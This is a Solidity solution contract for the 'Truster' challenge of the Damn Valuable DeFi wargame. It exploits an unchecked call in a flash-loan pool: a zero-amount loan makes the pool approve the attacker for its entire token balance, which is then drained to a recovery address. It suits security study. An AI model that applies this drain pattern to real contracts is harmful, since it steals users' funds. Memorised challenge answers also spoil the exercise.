// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract Solve {
    constructor(address pool, address token, address recovery) {
        TrusterLenderPool(pool).flashLoan(
            0,
            msg.sender,
            address(token),
            abi.encodeWithSelector(DamnValuableToken(token).approve.selector, address(this), type(uint256).max)
        );
        DamnValuableToken(token).transferFrom(pool, recovery, DamnValuableToken(token).balanceOf(pool));
    }
}
